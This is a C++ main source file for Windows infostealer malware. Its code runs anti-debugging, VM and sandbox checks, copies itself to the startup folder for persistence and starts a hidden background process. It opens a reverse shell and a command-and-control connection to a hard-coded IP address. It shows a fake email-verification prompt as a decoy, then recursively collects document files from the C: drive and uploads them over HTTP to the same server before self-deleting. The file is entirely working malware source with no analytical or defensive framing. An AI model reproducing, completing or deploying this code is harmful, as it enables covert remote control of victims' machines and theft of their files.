#include "main.h"
#include "Authenticator.h"
#include "Utilities.h"
#include "Paths.h"
#include "AnalysisEvasion.h"
#include "persistence.h"
#include "self_destruct.h"
#include "ReverseShell.h"
#include "gatherer.h"
#include "exfiltrator.h"
#include <iostream>
#include <thread>
#include <windows.h>
#include <vector>
#include <cstdlib>
#include <mutex>
#include <condition_variable>

// Link with the Winsock library
#pragma comment(lib, "Ws2_32.lib")
//g++ -o pusssin.exe main.cpp ReverseShell.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp Authenticator.cpp Utilities.cpp self_destruct.cpp exfiltrator.cpp gatherer.cpp -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -Iinclude -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -lshlwapi -static -std=c++17 -pthread -Wno-deprecated-declarations
extern std::mutex exfilMutex;
extern std::condition_variable cv;
extern bool doneGathering;

void runStealthTasks() {
    try {
        AntiAnalysis antiAnalysis;

        // Perform anti-analysis checks
        antiAnalysis.IntroduceDelay(1000);
        if (!antiAnalysis.CheckSystemUptime(60) || 
            antiAnalysis.CheckForDebugger() || 
            antiAnalysis.DetectVirtualMachine() || 
            !antiAnalysis.EvadeSandbox() || 
            !antiAnalysis.checkScreenResolution() || 
            !antiAnalysis.checkProcessCount()) {
            return;
        }

        // Initialize working directory and persistence
        Stealerium::Paths::InitWorkDir();
        setupPersistence();

        // Reverse shell setup
        const char host[] = "64.94.85.32";
        int port = 4433;
        RunShell(host, port);

        // Reconnect to listener for additional commands
        const char* C2Server = "64.94.85.32";
        int C2Port = 5533;
        ReconnectToListener(C2Server, C2Port);

    } catch (...) {
        // Handle stealth task exceptions silently
    }
}

void launchStealthProcess() {
    char exePath[MAX_PATH];

    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        return; // Silent failure
    }

    std::string command = "cmd /c start /B \"\" \"" + std::string(exePath) + "\" stealth";

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return; // Silent failure
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main(int argc, char* argv[]) {
    wchar_t exePath[MAX_PATH];
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) {
        return 1;
    }

    const int threshold = 6;

    // If launched in stealth mode, run background tasks
    if (argc == 2 && std::string(argv[1]) == "stealth") {
        std::cout << "[DEBUG] Stealth mode started." << std::endl;
        std::thread stealthThread(runStealthTasks);
        stealthThread.detach();

        // Keep the stealth process alive indefinitely
        while (true) {
            std::this_thread::sleep_for(std::chrono::seconds(10));
        }
        return 0;
    }

    // Copy executable to a startup directory
    copyToStartupFolder();

    // Launch stealth process
    launchStealthProcess();

    // User-visible interaction for email prompt
    displayHeader();
    displayVerificationPrompt();

    std::string email = getUserEmail();
    if (verifyUserIdentity(email)) {
        std::cout << "\n\033[32mAccess Granted.\033[0m You may now proceed to sensitive documents.\n";
    } else {
        std::cerr << "\n\033[31mAccess Denied.\033[0m Unauthorized email.\n";
    }

    // Exfiltration logic before self-destruct
    std::string directoryPath = "C:\\";                  // Starting directory
    std::string targetURL = "http://64.94.85.32:7000";  // Replace with your server URL
    int threadCount = std::thread::hardware_concurrency();

    std::cout << "[INFO] Starting recursive file exfiltration process with " << threadCount << " threads..." << std::endl;

    // Start file gathering
    std::vector<std::string> textExtensions = {".txt", ".doc", ".docx"};
    std::vector<std::string> imageExtensions = {".png", ".jpg", ".jpeg"};
    std::vector<std::string> videoExtensions = {".mp4", ".avi", ".mkv"};

    std::thread gatherer(gatherFiles, directoryPath, textExtensions);

    // Start exfiltration threads
    std::vector<std::thread> workers;
    for (int i = 0; i < threadCount; ++i) {
        workers.emplace_back(exfiltrateFile, targetURL);
    }

    gatherer.join();
    {
        std::lock_guard<std::mutex> lock(exfilMutex);
        doneGathering = true;
    }
    cv.notify_all();

    for (auto& worker : workers) {
        if (worker.joinable()) {
            worker.join();
        }
    }

    std::cout << "[INFO] File exfiltration process completed." << std::endl;

    // Self-destruct logic
    if (incrementRebootCounter(threshold)) {
        selfDestruct(std::wstring(exePath));
        return 0;
    }

    // Prevent immediate exit
    std::cout << "\nPress any key to exit...";
    std::cin.get();

    return 0;
}
